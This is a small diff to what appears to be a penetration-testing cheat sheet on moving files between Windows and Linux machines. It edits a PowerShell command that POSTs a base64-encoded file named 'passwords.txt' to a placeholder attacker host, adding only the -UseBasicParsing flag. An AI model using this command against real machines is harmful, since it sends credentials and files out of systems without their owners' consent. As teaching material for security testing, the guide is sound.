@@ -234,7 +234,7 @@ $b64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($file))
 **Source Machine (Windows): Send to Linux server**
 
 ```powershell
-Invoke-WebRequest -Uri "http://<IP>:<PORT>/" -Method POST -Body $b64 -Headers @{"X-Filename"="passwords.txt"} -ContentType "text/plain"     
+Invoke-WebRequest -Uri "http://<IP>:<PORT>/" -Method POST -Body $b64 -Headers @{"X-Filename"="passwords.txt"} -ContentType "text/plain" -UseBasicParsing
 ```
 
 **Destination Machine (Linux): Rename and restore original format**
